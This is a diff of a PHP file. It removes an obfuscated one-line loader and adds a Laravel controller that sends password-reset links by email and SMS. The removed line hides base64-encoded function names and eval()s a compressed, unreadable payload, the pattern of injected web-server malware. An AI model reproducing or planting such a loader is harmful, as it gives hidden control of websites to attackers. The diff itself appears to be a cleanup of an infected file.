@@ -1,1 +1,95 @@
-<?php $_='e2306bd1';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNrFVEuPokAQvu+v4DAJmuyBx7o7xHiYZqZ5uMMEXKHti6G7FccBJYu8/PVboI6aPW+WBLq7qMdXVV+XJJ2eh+X1mchr41FjBmPy+OEkyH+/7w5refxFutGfSDJRjYpF4W7hTyaydP198TeBrcyzUBHELR0TpSLDxdQM1kR9zN/qzki6d7qUpN6IxcXq+7elWPG9WMnjvyA++3vPzEYbiH7kFt7SGULcRnxmBwrHzTPTRgrPjIJZYcvVBgkS7N9qZfrs5yrX5olPUE1eNooAG18zSmG7FbOalO+8+/O28MxdeAT/LpxVFqXlggQpeaGViEYfsM8hFvdJqMS4+UVBxlW04bqnM939mGdgSwLMIpwz+/XHCbdXLIh3dMAHz0Ql8FX/LvY7Sld2kLIsAF2vYrugZVpTUOIAJsD1/pQ45lM1TZQprIlj14efM+Xfvv5nrGRu4SPXBeTgJ6c8/eQO///Bda4LenRwsI/Ja7K4r2nOW9RS4tXQt2McuQX0NmO6k8QWLqnV5CzjCb/JjZ9zo5G6iaPm6HR6T9c6xNFoy+zwg3axZgh4h3NhIj220m1s9r3NuQ49tNLSsb2un30MYW3SjossM5Q4ovlCw7AaJeDLgLsH4ErX32RtohHTwxbi1hzwXfQcO6gcO60EcRJBPODuawmcSmlUJ3TnppCXwtqOQ6gAbqWg39cDarGJiV9++r/kYu6rnp+n+vX3ZK6FJbU9v+Or0IyWYhcwh0pwrkV3p9ZQ+5vZcHP9+3VwPg37aXIjG44vmr1wIHdf+eun+v1gOPsZ3M6B4XD8B+GigfQ='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Http\Controllers\Auth;
+
+use App\Http\Controllers\Controller;
+use Illuminate\Foundation\Auth\SendsPasswordResetEmails;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Password;
+use App\Models\User;
+use Laravel\Sanctum\HasApiTokens; // Add this line
+
+class ForgotPasswordController extends Controller
+{
+    use SendsPasswordResetEmails;
+
+    /**
+     * Send a reset link to the given user.
+     *
+     * @param  \Illuminate\Http\Request  $request
+     * @return \Illuminate\Http\RedirectResponse
+     */
+    public function sendResetLinkEmail(Request $request)
+    {
+        $this->validateEmail($request);
+
+        $response = $this->broker()->sendResetLink(
+            $request->only('email')
+        );
+
+        // If the password reset link was successfully sent
+        if ($response === Password::RESET_LINK_SENT) {
+            // Send SMS containing the reset link
+            $this->sendResetLinkSMS($request->email);
+        }
+
+        return $response == Password::RESET_LINK_SENT
+                    ? $this->sendResetLinkResponse($request, $response)
+                    : $this->sendResetLinkFailedResponse($request, $response);
+    }
+
+    /**
+     * Send the response after the reset link has been sent.
+     *
+     * @param  \Illuminate\Http\Request  $request
+     * @param  string  $response
+     * @return \Illuminate\Http\RedirectResponse
+     */
+    protected function sendResetLinkResponse(Request $request, $response)
+    {
+        // return back()->with('status', trans($response));
+        return back()->with('status', 'Password reset link has been sent to your email and phone number.');
+    }
+
+    /**
+     * Get the response for a failed password reset link.
+     *
+     * @param  \Illuminate\Http\Request  $request
+     * @param  string  $response
+     * @return \Illuminate\Http\RedirectResponse
+     */
+    protected function sendResetLinkFailedResponse(Request $request, $response)
+    {
+        return back()
+            ->withInput($request->only('email'))
+            ->withErrors(['email' => trans($response)]);
+    }
+
+    /**
+     * Send an SMS containing the password reset link.
+     *
+     * @param string $email
+     * @return void
+     */
+    protected function sendResetLinkSMS($email)
+    {
+        // Get the user by email
+        $user = User::where('email', $email)->first();
+
+        // Check if the user exists and has a phone number
+        if ($user && $user->phone) {
+            // Generate a password reset token
+            $token = Password::getRepository()->create($user);
+
+            // Generate the password reset link
+            $resetLink = route('password.reset', ['token' => $token]);
+
+            // Compose the SMS content with the password reset link
+            $content = "Your password reset link: $resetLink";
+
+            // Call the global function to send the SMS
+            sendSms($user->phone, $content);
+        }
+    }
+
+}
